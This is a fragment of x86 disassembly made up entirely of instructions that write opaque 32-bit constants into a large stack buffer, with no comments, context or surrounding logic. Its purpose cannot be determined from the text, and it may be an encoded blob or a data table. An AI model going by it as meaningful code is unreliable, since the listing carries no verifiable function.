mov [ ebp - 0xd8c ] 0xd8a0db53
mov [ ebp - 0xd88 ] 0x27139007
mov [ ebp - 0xd84 ] 0x8a9d8e4c
mov [ ebp - 0xd80 ] 0xff0e4861
mov [ ebp - 0xd7c ] 0x8f53e2d9
mov [ ebp - 0xd78 ] 0xe109e7d0
mov [ ebp - 0xd74 ] 0x722797b6
mov [ ebp - 0xd70 ] 0x3dfea8ea
mov [ ebp - 0xd6c ] 0x8b159e83
mov [ ebp - 0xd68 ] 0x7bb2292e
mov [ ebp - 0xd64 ] 0x18054fb7
mov [ ebp - 0xd60 ] 0x70171397
mov [ ebp - 0xd5c ] 0xc6ff6af5
mov [ ebp - 0xd58 ] 0x8a70852
mov [ ebp - 0xd54 ] 0x8a7acfa0
mov [ ebp - 0xd50 ] 0xfac77877
mov [ ebp - 0xd4c ] 0x4585dc16
mov [ ebp - 0xd48 ] 0xbcc03705
mov [ ebp - 0xd44 ] 0x1dd4c586
mov [ ebp - 0xd40 ] 0xcd8debd8
mov [ ebp - 0xd3c ] 0xa8938c56
mov [ ebp - 0xd38 ] 0x35b03b95
mov [ ebp - 0xd34 ] 0x81bf2b0a
mov [ ebp - 0xd30 ] 0xba7b86a3
mov [ ebp - 0xd2c ] 0x68ff0162
mov [ ebp - 0xd28 ] 0xbf24bf38
mov [ ebp - 0xd24 ] 0x5cdcf984
mov [ ebp - 0xd20 ] 0x3a296ae4
mov [ ebp - 0xd1c ] 0x8be2bdf6
mov [ ebp - 0xd18 ] 0x2c093f8
mov [ ebp - 0xd14 ] 0x61837fbe
mov [ ebp - 0xd10 ] 0x681bfe05
mov [ ebp - 0xd0c ] 0x38d01aff
mov [ ebp - 0xd08 ] 0x5df7f4d9
mov [ ebp - 0xd04 ] 0xd2b9d3ed
mov [ ebp - 0xd00 ] 0x340ce33d
mov [ ebp - 0xcfc ] 0x98bfefa0
mov [ ebp - 0xcf8 ] 0x409a8082
mov [ ebp - 0xcf4 ] 0x5a11dff
mov [ ebp - 0xcf0 ] 0x1b6dbd1b
mov [ ebp - 0xcec ] 0xb1533dd7
mov [ ebp - 0xce8 ] 0x1f0e4a31
mov [ ebp - 0xce4 ] 0x5bf1c81d
mov [ ebp - 0xce0 ] 0x4b8ffdab
mov [ ebp - 0xcdc ] 0x6ee34eec
mov [ ebp - 0xcd8 ] 0xceae7dce
mov [ ebp - 0xcd4 ] 0xb5d3509a
mov [ ebp - 0xcd0 ] 0xe4d0400d
mov [ ebp - 0xccc ] 0xae95237d
mov [ ebp - 0xcc8 ] 0x8bcda46d
mov [ ebp - 0xcc4 ] 0x17e6be6c
mov [ ebp - 0xcc0 ] 0xa86275bc
mov [ ebp - 0xcbc ] 0x921745c3
mov [ ebp - 0xcb8 ] 0x5c60c5c2
mov [ ebp - 0xcb4 ] 0x22113315
mov [ ebp - 0xcb0 ] 0xf007e273
mov [ ebp - 0xcac ] 0x739e9c05
mov [ ebp - 0xca8 ] 0xacfe6c40
mov [ ebp - 0xca4 ] 0xe6c3e42a
mov [ ebp - 0xca0 ] 0x1c8f2559
mov [ ebp - 0xc9c ] 0x2caea66a
mov [ ebp - 0xc98 ] 0x81880e6b
mov [ ebp - 0xc94 ] 0xb4a39a41
mov [ ebp - 0xc90 ] 0x81a4aa7c
mov [ ebp - 0xc8c ] 0x87f44347
mov [ ebp - 0xc88 ] 0xd934f2af
mov [ ebp - 0xc84 ] 0x2fc0f7d6
mov [ ebp - 0xc80 ] 0x874c4f1d
mov [ ebp - 0xc7c ] 0x60b4faf5
mov [ ebp - 0xc78 ] 0x4ae13c09
mov [ ebp - 0xc74 ] 0x52ff85d6
mov [ ebp - 0xc70 ] 0x76d4a32f
mov [ ebp - 0xc6c ] 0x95fec8e6
mov [ ebp - 0xc68 ] 0x916f32bb
mov [ ebp - 0xc64 ] 0x46c12f29
mov [ ebp - 0xc60 ] 0x73ce0d7e
mov [ ebp - 0xc5c ] 0x10d38207
mov [ ebp - 0xc58 ] 0x955bb5be
mov [ ebp - 0xc54 ] 0x69e75a3a
mov [ ebp - 0xc50 ] 0xe4e0bbfd
mov [ ebp - 0xc4c ] 0x3f79de84
mov [ ebp - 0xc48 ] 0x39d0e810
mov [ ebp - 0xc44 ] 0x95809117
mov [ ebp - 0xc40 ] 0xa6084e9e
mov [ ebp - 0xc3c ] 0x8eb6dcd0
mov [ ebp - 0xc38 ] 0xcb231191
mov [ ebp - 0xc34 ] 0x69340b6b
mov [ ebp - 0xc30 ] 0x4a4d14c6
mov [ ebp - 0xc2c ] 0x289c6f2
mov [ ebp - 0xc28 ] 0xc63c5aaf
mov [ ebp - 0xc24 ] 0x8a5cbceb
mov [ ebp - 0xc20 ] 0xda30640a
mov [ ebp - 0xc1c ] 0xd168e640
mov [ ebp - 0xc18 ] 0x639c8cf8
mov [ ebp - 0xc14 ] 0x5dccd197
mov [ ebp - 0xc10 ] 0xd8a819e5
mov [ ebp - 0xc0c ] 0x8fda31e0
mov [ ebp - 0xc08 ] 0x7755168b
mov [ ebp - 0xc04 ] 0xdc01b1d2
mov [ ebp - 0xc00 ] 0x56b63116
mov [ ebp - 0xbfc ] 0xf281f17
mov [ ebp - 0xbf8 ] 0x4273c4ab
mov [ ebp - 0xbf4 ] 0x7b9f3f95
mov [ ebp - 0xbf0 ] 0x39534759
mov [ ebp - 0xbec ] 0x4c82d79
mov [ ebp - 0xbe8 ] 0x167b1d44
mov [ ebp - 0xbe4 ] 0xe5f37ccf
mov [ ebp - 0xbe0 ] 0xc53ba9ad
mov [ ebp - 0xbdc ] 0x73d463c8
mov [ ebp - 0xbd8 ] 0xbdb54728
mov [ ebp - 0xbd4 ] 0xe0385587
mov [ ebp - 0xbd0 ] 0x15198b9c
mov [ ebp - 0xbcc ] 0xfd1ae1b9
mov [ ebp - 0xbc8 ] 0xcd1395fe
mov [ ebp - 0xbc4 ] 0xbfb20612
mov [ ebp - 0xbc0 ] 0x7884eeb0
mov [ ebp - 0xbbc ] 0x79ec5951
mov [ ebp - 0xbb8 ] 0x2737a1a0
mov [ ebp - 0xbb4 ] 0x93076ff6
mov [ ebp - 0xbb0 ] 0xb4a820fb
mov [ ebp - 0xbac ] 0xb1c201
mov [ ebp - 0xba8 ] 0x6acdc458
mov [ ebp - 0xba4 ] 0x7b2980cb
mov [ ebp - 0xba0 ] 0xbff3ae6e
mov [ ebp - 0xb9c ] 0xa739df07
mov [ ebp - 0xb98 ] 0x77cf7081
mov [ ebp - 0xb94 ] 0xda0ad6df
mov [ ebp - 0xb90 ] 0xf88eb3f7
mov [ ebp - 0xb8c ] 0xcdf83f75
mov [ ebp - 0xb88 ] 0xcf37c604
mov [ ebp - 0xb84 ] 0xb44a6146
mov [ ebp - 0xb80 ] 0x16733d0f
mov [ ebp - 0xb7c ] 0x9ebdac1d
mov [ ebp - 0xb78 ] 0xfc158c1c
mov [ ebp - 0xb74 ] 0x5ad62063
mov [ ebp - 0xb70 ] 0x485265d3
mov [ ebp - 0xb6c ] 0xa8164ba4
mov [ ebp - 0xb68 ] 0x57774d11
mov [ ebp - 0xb64 ] 0xbd0bc1ae
mov [ ebp - 0xb60 ] 0x1cd37eff
mov [ ebp - 0xb5c ] 0x47ba912b
mov [ ebp - 0xb58 ] 0x8043cf1d
mov [ ebp - 0xb54 ] 0xc2da1aef
mov [ ebp - 0xb50 ] 0x230b2d7f
mov [ ebp - 0xb4c ] 0x89cc2178
mov [ ebp - 0xb48 ] 0x1de0436e
mov [ ebp - 0xb44 ] 0x4daeb05
mov [ ebp - 0xb40 ] 0x9420ae69
mov [ ebp - 0xb3c ] 0x5cdcda3f
mov [ ebp - 0xb38 ] 0x99dd1fa9
mov [ ebp - 0xb34 ] 0xb85bb739
mov [ ebp - 0xb30 ] 0x5cdc66e4
mov [ ebp - 0xb2c ] 0xf6e5a887
mov [ ebp - 0xb28 ] 0xf013c5eb
mov [ ebp - 0xb24 ] 0x1af4edb0
mov [ ebp - 0xb20 ] 0xdaae149b
mov [ ebp - 0xb1c ] 0x98378aee
mov [ ebp - 0xb18 ] 0xe33114aa
mov [ ebp - 0xb14 ] 0xb09c8ccb
mov [ ebp - 0xb10 ] 0x7a0c78f3
mov [ ebp - 0xb0c ] 0xb70f220
mov [ ebp - 0xb08 ] 0x68fc83b7
mov [ ebp - 0xb04 ] 0xc82f071
mov [ ebp - 0xb00 ] 0xf3e73005
mov [ ebp - 0xafc ] 0x658b1ebb
mov [ ebp - 0xaf8 ] 0xfd48bc32
mov [ ebp - 0xaf4 ] 0x3cade449
mov [ ebp - 0xaf0 ] 0x7cb6ba5c
mov [ ebp - 0xaec ] 0x638827ac
mov [ ebp - 0xae8 ] 0x1bcb84aa
mov [ ebp - 0xae4 ] 0x79284d74
mov [ ebp - 0xae0 ] 0x396d0f7e
mov [ ebp - 0xadc ] 0x5f9ef82d
mov [ ebp - 0xad8 ] 0xfe5ce6b5
mov [ ebp - 0xad4 ] 0x273a0acb
mov [ ebp - 0xad0 ] 0x70a4f0c4
mov [ ebp - 0xacc ] 0xc2d32c17
mov [ ebp - 0xac8 ] 0x24dd9fb0
mov [ ebp - 0xac4 ] 0x6a9e05ec
mov [ ebp - 0xac0 ] 0x41a30b14
mov [ ebp - 0xabc ] 0xb8a04103
mov [ ebp - 0xab8 ] 0xf3b6fd28
mov [ ebp - 0xab4 ] 0xcb1af007
mov [ ebp - 0xab0 ] 0xf83bbee1
mov [ ebp - 0xaac ] 0x9aba0eea
mov [ ebp - 0xaa8 ] 0x9abf98ad
mov [ ebp - 0xaa4 ] 0xb2045d9d
mov [ ebp - 0xaa0 ] 0x6bf3a868
mov [ ebp - 0xa9c ] 0x112494e9
mov [ ebp - 0xa98 ] 0x9804da91
mov [ ebp - 0xa94 ] 0xac631fcb
mov [ ebp - 0xa90 ] 0xc8a49edd
mov [ ebp - 0xa8c ] 0x5a625fac
mov [ ebp - 0xa88 ] 0x94f421f7
mov [ ebp - 0xa84 ] 0xe646f87e
mov [ ebp - 0xa80 ] 0x8a523aa0
mov [ ebp - 0xa7c ] 0x5f9b76ce
mov [ ebp - 0xa78 ] 0x1bf7a050
mov [ ebp - 0xa74 ] 0x9cc75abf
mov [ ebp - 0xa70 ] 0xa4646cf8
mov [ ebp - 0xa6c ] 0xc2fec7cb
mov [ ebp - 0xa68 ] 0x6756f2e8
mov [ ebp - 0xa64 ] 0x8b4d9deb
mov [ ebp - 0xa60 ] 0xa5159fd7
mov [ ebp - 0xa5c ] 0x6604b115
mov [ ebp - 0xa58 ] 0x1081fb51
mov [ ebp - 0xa54 ] 0x4dac4955
mov [ ebp - 0xa50 ] 0x80f111b5
mov [ ebp - 0xa4c ] 0xc042f0d8
mov [ ebp - 0xa48 ] 0xcd2798e2
mov [ ebp - 0xa44 ] 0xc597535
mov [ ebp - 0xa40 ] 0x2ab16e14
mov [ ebp - 0xa3c ] 0x7090b51f
mov [ ebp - 0xa38 ] 0x58011b0
mov [ ebp - 0xa34 ] 0xf522d5a
mov [ ebp - 0xa30 ] 0x168f443e
mov [ ebp - 0xa2c ] 0x16d6d134
mov [ ebp - 0xa28 ] 0x9fe4fe6a
mov [ ebp - 0xa24 ] 0x87ac3d73
mov [ ebp - 0xa20 ] 0xcbb15dab
mov [ ebp - 0xa1c ] 0xc33b4113
mov [ ebp - 0xa18 ] 0xadc9bc53
mov [ ebp - 0xa14 ] 0x27bd1be9
mov [ ebp - 0xa10 ] 0x933d4c5f
mov [ ebp - 0xa0c ] 0x88aa131e
mov [ ebp - 0xa08 ] 0x84278e11
mov [ ebp - 0xa04 ] 0x760cd3cb
mov [ ebp - 0xa00 ] 0x4441bd31
mov [ ebp - 0x9fc ] 0x52077dff
mov [ ebp - 0x9f8 ] 0x22ffd039
mov [ ebp - 0x9f4 ] 0x4b49bcec
mov [ ebp - 0x9f0 ] 0x27df8609
mov [ ebp - 0x9ec ] 0xabaf8999
mov [ ebp - 0x9e8 ] 0xe22fd617
mov [ ebp - 0x9e4 ] 0xdb583baa
mov [ ebp - 0x9e0 ] 0xf81f9af9
mov [ ebp - 0x9dc ] 0x504a2617
mov [ ebp - 0x9d8 ] 0xe37249f7
mov [ ebp - 0x9d4 ] 0xf2ebb06
mov [ ebp - 0x9d0 ] 0xda360d41
mov [ ebp - 0x9cc ] 0xad85e596
mov [ ebp - 0x9c8 ] 0x658fb5bb
mov [ ebp - 0x9c4 ] 0xe940e8f0
mov [ ebp - 0x9c0 ] 0x99e15f82
mov [ ebp - 0x9bc ] 0x7de92b86
mov [ ebp - 0x9b8 ] 0x7b605b75
mov [ ebp - 0x9b4 ] 0x578a8e16
mov [ ebp - 0x9b0 ] 0x3231c09c
mov [ ebp - 0x9ac ] 0x60e0b7a5
mov [ ebp - 0x9a8 ] 0x5cc66f6c
mov [ ebp - 0x9a4 ] 0xd9460657
mov [ ebp - 0x9a0 ] 0xec722766
mov [ ebp - 0x99c ] 0xc8695b53
mov [ ebp - 0x998 ] 0xcc43c9b6
mov [ ebp - 0x994 ] 0xf323cd57
mov [ ebp - 0x990 ] 0x3226558d
mov [ ebp - 0x98c ] 0x7892060c
mov [ ebp - 0x988 ] 0xcdd45875
mov [ ebp - 0x984 ] 0xc5a61a5f
mov [ ebp - 0x980 ] 0x95b11942
mov [ ebp - 0x97c ] 0x2b5d1a74
mov [ ebp - 0x978 ] 0x3af7a0e3
mov [ ebp - 0x974 ] 0xfa2e1b6d
mov [ ebp - 0x970 ] 0x7c2c5470
mov [ ebp - 0x96c ] 0xcff4be5a
mov [ ebp - 0x968 ] 0x769cc817
mov [ ebp - 0x964 ] 0x253b43e3
mov [ ebp - 0x960 ] 0xd0baec5c
mov [ ebp - 0x95c ] 0xe9fb1706
mov [ ebp - 0x958 ] 0x2423f3b7
mov [ ebp - 0x954 ] 0x7e1e510e
mov [ ebp - 0x950 ] 0xfffa4aa5
mov [ ebp - 0x94c ] 0x1fcfee08
mov [ ebp - 0x948 ] 0x99956bb6
mov [ ebp - 0x944 ] 0xabed0ae
mov [ ebp - 0x940 ] 0xc2db78bc
mov [ ebp - 0x93c ] 0x46abd68f
mov [ ebp - 0x938 ] 0xd76acfc9
mov [ ebp - 0x934 ] 0xc6558820
mov [ ebp - 0x930 ] 0xdbc54fd2
mov [ ebp - 0x92c ] 0xf4fa943d
mov [ ebp - 0x928 ] 0xae8d9000
mov [ ebp - 0x924 ] 0x1db94c60
mov [ ebp - 0x920 ] 0x54df94c4
mov [ ebp - 0x91c ] 0x349a8b6a
mov [ ebp - 0x918 ] 0x7a0b055a
mov [ ebp - 0x914 ] 0x6040618d
mov [ ebp - 0x910 ] 0xee3b06b0
mov [ ebp - 0x90c ] 0x9ae2359a
mov [ ebp - 0x908 ] 0x26496fc5
mov [ ebp - 0x904 ] 0x804302bb
mov [ ebp - 0x900 ] 0xd42296
mov [ ebp - 0x8fc ] 0x7346ead
mov [ ebp - 0x8f8 ] 0x1824073
mov [ ebp - 0x8f4 ] 0x5161c2a1
mov [ ebp - 0x8f0 ] 0x633f9cc8
mov [ ebp - 0x8ec ] 0x97fd21d1
mov [ ebp - 0x8e8 ] 0x4cbd4691
mov [ ebp - 0x8e4 ] 0xdecc0048
mov [ ebp - 0x8e0 ] 0xd0dfa022
mov [ ebp - 0x8dc ] 0x82d7130f
mov [ ebp - 0x8d8 ] 0xf4835953
mov [ ebp - 0x8d4 ] 0xe446e41c
mov [ ebp - 0x8d0 ] 0x52478580
mov [ ebp - 0x8cc ] 0x38e945a7
mov [ ebp - 0x8c8 ] 0xd484a68b
mov [ ebp - 0x8c4 ] 0xc8b251a6
mov [ ebp - 0x8c0 ] 0x9891f1
mov [ ebp - 0x8bc ] 0xf88370a5
mov [ ebp - 0x8b8 ] 0xe5ed06c9
mov [ ebp - 0x8b4 ] 0x6bca33eb
mov [ ebp - 0x8b0 ] 0x5fbd11b8
mov [ ebp - 0x8ac ] 0xe297a656
mov [ ebp - 0x8a8 ] 0xf2b61c4c
mov [ ebp - 0x8a4 ] 0x5ebb686d
mov [ ebp - 0x8a0 ] 0x9f5f53fa
mov [ ebp - 0x89c ] 0x8d97e2c3
mov [ ebp - 0x898 ] 0xd37284e8
mov [ ebp - 0x894 ] 0x703f3cb7
mov [ ebp - 0x890 ] 0xa4cffc4e
mov [ ebp - 0x88c ] 0xef8667a3
mov [ ebp - 0x888 ] 0xf0e23c83
mov [ ebp - 0x884 ] 0x9f4e9da5
mov [ ebp - 0x880 ] 0xb43eadf0
mov [ ebp - 0x87c ] 0x7841d58f
mov [ ebp - 0x878 ] 0x114bb35a
mov [ ebp - 0x874 ] 0x3e818af0
mov [ ebp - 0x870 ] 0x2ae25187
mov [ ebp - 0x86c ] 0x3b1969b8
mov [ ebp - 0x868 ] 0x4a2bfba5
mov [ ebp - 0x864 ] 0x89e97998
mov [ ebp - 0x860 ] 0xb63d2727
mov [ ebp - 0x85c ] 0x572e7efd
mov [ ebp - 0x858 ] 0x21687a31
mov [ ebp - 0x854 ] 0x8b5fea04
mov [ ebp - 0x850 ] 0xf3b5423b
mov [ ebp - 0x84c ] 0x502ecfab
mov [ ebp - 0x848 ] 0x639b59ca
mov [ ebp - 0x844 ] 0xf9ec84d2
mov [ ebp - 0x840 ] 0xa9b029ac
mov [ ebp - 0x83c ] 0xd800dea7
mov [ ebp - 0x838 ] 0x5dfa6858
mov [ ebp - 0x834 ] 0x8de85952
mov [ ebp - 0x830 ] 0x46809e9b
mov [ ebp - 0x82c ] 0x3797ae6d
mov [ ebp - 0x828 ] 0xda9a3207
mov [ ebp - 0x824 ] 0x62d386b6
mov [ ebp - 0x820 ] 0x560b83af
mov [ ebp - 0x81c ] 0xba2f0b62
mov [ ebp - 0x818 ] 0xc6172974
mov [ ebp - 0x814 ] 0x1e540082
mov [ ebp - 0x810 ] 0xb64d49e
mov [ ebp - 0x80c ] 0x8a42fb83
mov [ ebp - 0x808 ] 0xe464dd2d
mov [ ebp - 0x804 ] 0x13463863
mov [ ebp - 0x800 ] 0x1d6952bb
mov [ ebp - 0x7fc ] 0xd1d8985d
mov [ ebp - 0x7f8 ] 0x4498efc1
mov [ ebp - 0x7f4 ] 0x8d62ecef
mov [ ebp - 0x7f0 ] 0x4398c6c0
mov [ ebp - 0x7ec ] 0xefcedbc2
mov [ ebp - 0x7e8 ] 0x1bd332b8
mov [ ebp - 0x7e4 ] 0x262e1a6a
mov [ ebp - 0x7e0 ] 0xc943986c
mov [ ebp - 0x7dc ] 0xf29b1b30
mov [ ebp - 0x7d8 ] 0xfa36330b
mov [ ebp - 0x7d4 ] 0xdf88981f
mov [ ebp - 0x7d0 ] 0x2023205e
mov [ ebp - 0x7cc ] 0xb310f1fb
mov [ ebp - 0x7c8 ] 0x8ecfe323
mov [ ebp - 0x7c4 ] 0x69b4fdfd
mov [ ebp - 0x7c0 ] 0xc633f795
mov [ ebp - 0x7bc ] 0x1eb8ce13
mov [ ebp - 0x7b8 ] 0x2018ee01
mov [ ebp - 0x7b4 ] 0xe4ffa086
mov [ ebp - 0x7b0 ] 0xbc0522c1
mov [ ebp - 0x7ac ] 0x37701513
mov [ ebp - 0x7a8 ] 0xf6c53ff8
mov [ ebp - 0x7a4 ] 0xd25f793c
mov [ ebp - 0x7a0 ] 0x83989270
mov [ ebp - 0x79c ] 0x61a15060
mov [ ebp - 0x798 ] 0xc481ba3e
mov [ ebp - 0x794 ] 0x1ba8815a
mov [ ebp - 0x790 ] 0xb7d8ada3
mov [ ebp - 0x78c ] 0xbbee48c2
mov [ ebp - 0x788 ] 0xc3b1b387
mov [ ebp - 0x784 ] 0x9c95102c
mov [ ebp - 0x780 ] 0x3202da3
mov [ ebp - 0x77c ] 0xbb65c17d
mov [ ebp - 0x778 ] 0xd67fe67b
mov [ ebp - 0x774 ] 0xbf12867
mov [ ebp - 0x770 ] 0x98c2c9d5
mov [ ebp - 0x76c ] 0x9853b011
mov [ ebp - 0x768 ] 0x8f5c0463
mov [ ebp - 0x764 ] 0xb72bf114
mov [ ebp - 0x760 ] 0x9cbb4b1f
mov [ ebp - 0x75c ] 0x8858200d
mov [ ebp - 0x758 ] 0x6e5ed706
mov [ ebp - 0x754 ] 0xd57950ff
mov [ ebp - 0x750 ] 0x2b6d3b19
mov [ ebp - 0x74c ] 0x4ec3c0eb
mov [ ebp - 0x748 ] 0xd8dd1fc4
mov [ ebp - 0x744 ] 0x30900811
mov [ ebp - 0x740 ] 0x61cc4b54
mov [ ebp - 0x73c ] 0x71e9246b
mov [ ebp - 0x738 ] 0xfbdf48fc
mov [ ebp - 0x734 ] 0xb1d05898
mov [ ebp - 0x730 ] 0x7edc3d93
mov [ ebp - 0x72c ] 0xc1cca0fd
mov [ ebp - 0x728 ] 0xd09aa9bf
mov [ ebp - 0x724 ] 0x6002ab2
mov [ ebp - 0x720 ] 0xe067cd75
mov [ ebp - 0x71c ] 0xed5150f1
mov [ ebp - 0x718 ] 0x30e93198
mov [ ebp - 0x714 ] 0x1de2b989
mov [ ebp - 0x710 ] 0xf49bbef7
mov [ ebp - 0x70c ] 0x1eb6685e
mov [ ebp - 0x708 ] 0xc3ee5011
mov [ ebp - 0x704 ] 0xefc9ef7a
mov [ ebp - 0x700 ] 0xadcf30bc
mov [ ebp - 0x6fc ] 0x199b2081
mov [ ebp - 0x6f8 ] 0xdb4a8451
mov [ ebp - 0x6f4 ] 0x34f82c3d
mov [ ebp - 0x6f0 ] 0x492993ea
mov [ ebp - 0x6ec ] 0xd67dffb
mov [ ebp - 0x6e8 ] 0xa9d0552f
mov [ ebp - 0x6e4 ] 0x989a44
mov [ ebp - 0x6e0 ] 0x4bae67ca
mov [ ebp - 0x6dc ] 0xd9654987
mov [ ebp - 0x6d8 ] 0xab4afcd
mov [ ebp - 0x6d4 ] 0xc53facdb
mov [ ebp - 0x6d0 ] 0x3b0e683f
mov [ ebp - 0x6cc ] 0x76487547
mov [ ebp - 0x6c8 ] 0xf1f18cb
mov [ ebp - 0x6c4 ] 0x7d10b7b2
mov [ ebp - 0x6c0 ] 0xa5c8be1e
mov [ ebp - 0x6bc ] 0xd47e2d07
mov [ ebp - 0x6b8 ] 0xb7de32dc
mov [ ebp - 0x6b4 ] 0x1e7d1dde
mov [ ebp - 0x6b0 ] 0xcc598b85
mov [ ebp - 0x6ac ] 0xcc42a101
mov [ ebp - 0x6a8 ] 0x6cdb61b9
mov [ ebp - 0x6a4 ] 0x36e9eb18
mov [ ebp - 0x6a0 ] 0xb0dcb1a9
mov [ ebp - 0x69c ] 0xbb845adf
mov [ ebp - 0x698 ] 0x6b73638d
mov [ ebp - 0x694 ] 0x689f080
mov [ ebp - 0x690 ] 0x7cd2e27b
mov [ ebp - 0x68c ] 0x3d481583
mov [ ebp - 0x688 ] 0x8fa92476
mov [ ebp - 0x684 ] 0xb9c5920f
mov [ ebp - 0x680 ] 0x2269a143
mov [ ebp - 0x67c ] 0x89deeefc
mov [ ebp - 0x678 ] 0xd1f45151
mov [ ebp - 0x674 ] 0xbcd77e41
mov [ ebp - 0x670 ] 0xe439aa60
mov [ ebp - 0x66c ] 0x352181bf
mov [ ebp - 0x668 ] 0xb5c4caa5
mov [ ebp - 0x664 ] 0x9f6e8a5c
mov [ ebp - 0x660 ] 0x27c2d72b
mov [ ebp - 0x65c ] 0x16b0a0c5
mov [ ebp - 0x658 ] 0x32e8a5f1
mov [ ebp - 0x654 ] 0x83eebf23
mov [ ebp - 0x650 ] 0x28672769
mov [ ebp - 0x64c ] 0x4e5e88a9
mov [ ebp - 0x648 ] 0xae032252
mov [ ebp - 0x644 ] 0xd84e71ac
mov [ ebp - 0x640 ] 0xeff1049
mov [ ebp - 0x63c ] 0xa125b0b0
mov [ ebp - 0x638 ] 0x78d30d55
mov [ ebp - 0x634 ] 0x36fbc1cc
mov [ ebp - 0x630 ] 0x925e63e9
mov [ ebp - 0x62c ] 0x3ee0bceb
mov [ ebp - 0x628 ] 0x8bece4df
mov [ ebp - 0x624 ] 0x9e633a55
mov [ ebp - 0x620 ] 0xfaad634a
mov [ ebp - 0x61c ] 0x689bd213
mov [ ebp - 0x618 ] 0xabe06edf
mov [ ebp - 0x614 ] 0x19e1db30
mov [ ebp - 0x610 ] 0x2aab403e
mov [ ebp - 0x60c ] 0xdb688bfc
mov [ ebp - 0x608 ] 0xc567546f
mov [ ebp - 0x604 ] 0xd963ca8f
mov [ ebp - 0x600 ] 0x40d4102d
mov [ ebp - 0x5fc ] 0xc1a86fe2
mov [ ebp - 0x5f8 ] 0xe6d88de
mov [ ebp - 0x5f4 ] 0xa2274e64
mov [ ebp - 0x5f0 ] 0x8bccd28e
mov [ ebp - 0x5ec ] 0xcd66345d
mov [ ebp - 0x5e8 ] 0x1892cd89
mov [ ebp - 0x5e4 ] 0xc5f1f598
mov [ ebp - 0x5e0 ] 0xe806c506
mov [ ebp - 0x5dc ] 0x13aaae35
mov [ ebp - 0x5d8 ] 0x9b211737
mov [ ebp - 0x5d4 ] 0xf43d4865
mov [ ebp - 0x5d0 ] 0x777f0a1a
mov [ ebp - 0x5cc ] 0xc744e53e
mov [ ebp - 0x5c8 ] 0x4bdfd6b3
mov [ ebp - 0x5c4 ] 0xd210d1cc
mov [ ebp - 0x5c0 ] 0xcbba1696
mov [ ebp - 0x5bc ] 0xfcde64c5
mov [ ebp - 0x5b8 ] 0xe197ff7b
mov [ ebp - 0x5b4 ] 0x61d5d447
mov [ ebp - 0x5b0 ] 0x1dd954de
mov [ ebp - 0x5ac ] 0xece41d39
mov [ ebp - 0x5a8 ] 0xc037c4f4
mov [ ebp - 0x5a4 ] 0x2b924895
mov [ ebp - 0x5a0 ] 0x23f74c5e
mov [ ebp - 0x59c ] 0x2c1fd5b1
mov [ ebp - 0x598 ] 0x1c0db6d5
mov [ ebp - 0x594 ] 0x697ee28b
mov [ ebp - 0x590 ] 0x70865736
mov [ ebp - 0x58c ] 0x685c6b74
mov [ ebp - 0x588 ] 0xc428942f
mov [ ebp - 0x584 ] 0x3aefbadc
mov [ ebp - 0x580 ] 0xb85ee607
mov [ ebp - 0x57c ] 0x91e47dbc
mov [ ebp - 0x578 ] 0xbfadf234
mov [ ebp - 0x574 ] 0xb282bd4
mov [ ebp - 0x570 ] 0xf77baf82
mov [ ebp - 0x56c ] 0x495fd71a
mov [ ebp - 0x568 ] 0x470d886b
mov [ ebp - 0x564 ] 0x4982fc42
mov [ ebp - 0x560 ] 0x9f01e0e3
mov [ ebp - 0x55c ] 0x9130e65d
mov [ ebp - 0x558 ] 0xac50ddd8
mov [ ebp - 0x554 ] 0x8bb77909
mov [ ebp - 0x550 ] 0x42823228
mov [ ebp - 0x54c ] 0x758be20a
mov [ ebp - 0x548 ] 0xacbd986a
mov [ ebp - 0x544 ] 0x77f63f94
mov [ ebp - 0x540 ] 0x7c16f71f
mov [ ebp - 0x53c ] 0xb50e46dd
mov [ ebp - 0x538 ] 0x2d625e24
mov [ ebp - 0x534 ] 0xffb819d7
mov [ ebp - 0x530 ] 0x56413b4c
mov [ ebp - 0x52c ] 0x87cbcc1d
mov [ ebp - 0x528 ] 0xf9338864
mov [ ebp - 0x524 ] 0xe67029c7
mov [ ebp - 0x520 ] 0xfe638721
mov [ ebp - 0x51c ] 0xf1b471cd
mov [ ebp - 0x518 ] 0xa71e16cf
mov [ ebp - 0x514 ] 0x7ba6d72f
mov [ ebp - 0x510 ] 0x2fd1e812
mov [ ebp - 0x50c ] 0x19b69db4
mov [ ebp - 0x508 ] 0xed12e925
mov [ ebp - 0x504 ] 0x34d38213
mov [ ebp - 0x500 ] 0xd7323609
mov [ ebp - 0x4fc ] 0x77c8e6a7
mov [ ebp - 0x4f8 ] 0x2c1ee7fc
mov [ ebp - 0x4f4 ] 0xd0a7c4be
mov [ ebp - 0x4f0 ] 0x61ff79ac
mov [ ebp - 0x4ec ] 0x3b7ab516
mov [ ebp - 0x4e8 ] 0xb1288c9e
mov [ ebp - 0x4e4 ] 0x18e5fc0e
mov [ ebp - 0x4e0 ] 0xdaef1832
mov [ ebp - 0x4dc ] 0xfb51b7fe
mov [ ebp - 0x4d8 ] 0x5c276f9e
mov [ ebp - 0x4d4 ] 0xe02cce33
mov [ ebp - 0x4d0 ] 0x5d412b47
mov [ ebp - 0x4cc ] 0x7f99bbe0
mov [ ebp - 0x4c8 ] 0x5530c147
mov [ ebp - 0x4c4 ] 0xf06d16bd
mov [ ebp - 0x4c0 ] 0x2cca5c2e
mov [ ebp - 0x4bc ] 0xb2271b14
mov [ ebp - 0x4b8 ] 0xbd0f4e8a
mov [ ebp - 0x4b4 ] 0x649d3b1d
mov [ ebp - 0x4b0 ] 0x47c2de67
mov [ ebp - 0x4ac ] 0xe0c65b99
mov [ ebp - 0x4a8 ] 0xda36f71c
mov [ ebp - 0x4a4 ] 0x3bcaa30d
mov [ ebp - 0x4a0 ] 0x14679400
mov [ ebp - 0x49c ] 0x39c68faf
mov [ ebp - 0x498 ] 0xfaf6d5dd
mov [ ebp - 0x494 ] 0x785f9411
mov [ ebp - 0x490 ] 0xcbf2172
mov [ ebp - 0x48c ] 0x98ec867c
mov [ ebp - 0x488 ] 0x8a72227d
mov [ ebp - 0x484 ] 0xc6c53cc6
mov [ ebp - 0x480 ] 0x7fda2cd0
mov [ ebp - 0x47c ] 0x99b8a0bb
mov [ ebp - 0x478 ] 0x8793af76
mov [ ebp - 0x474 ] 0xb5fff243
mov [ ebp - 0x470 ] 0x8fc1be13
mov [ ebp - 0x46c ] 0xc128ae44
mov [ ebp - 0x468 ] 0x964b9ad0
mov [ ebp - 0x464 ] 0xa75c10d7
mov [ ebp - 0x460 ] 0xf827363d
mov [ ebp - 0x45c ] 0x4d91dfd7
mov [ ebp - 0x458 ] 0xd1d4258e
mov [ ebp - 0x454 ] 0x2b87d317
